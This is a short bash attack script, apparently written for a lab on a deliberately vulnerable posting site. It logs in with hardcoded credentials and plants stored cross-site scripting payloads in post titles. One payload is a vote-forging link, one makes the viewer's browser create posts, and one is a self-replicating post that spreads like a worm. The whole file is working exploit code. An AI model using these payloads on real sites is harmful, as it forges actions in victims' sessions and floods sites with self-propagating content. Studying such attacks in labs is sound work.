#!/bin/bash

curl -c cookie.txt -d "username=ronald" -d "password=password123" -d "form=login" "$1/post.php" > response.txt

curl -b cookie.txt --data-urlencode "title=<a href='vote.php?id=2&vote=2176'>upvote post with id 2</a>" -d "content=" -d "type=1" -d "form=content" -d "submit=" "$1/post.php" >> response.txt

curl -b cookie.txt --data-urlencode "title=<script>function createPost() {  var xhr = new XMLHttpRequest(); var url = 'post.php'; var params = 'title=post in post&content=Post from post!&type=1&form=content&submit='; xhr.open('POST', url, true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(params);}</script><a href='javascript:createPost(); window.location.reload()'>create Post!</a>" -d "content=this post creates a post" -d "type=1" -d "form=content" -d "submit=" "$1/post.php" >> response.txt

curl -b cookie.txt --data-urlencode "title=<script>function createPost2() {  var xhr = new XMLHttpRequest(); var url = 'post.php'; var params = 'title=<a href=\"javascript:createPost2();window.location.reload()\">loop post</a>&content=loop post wooo!&type=1&form=content&submit='; xhr.open('POST', url, true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(params);}</script><a href='javascript:createPost2(); window.location.reload();'>begin loop posting!</a>" -d "content=this post creates a post" -d "type=1" -d "form=content" -d "submit=" "$1/post.php" >> response.txt
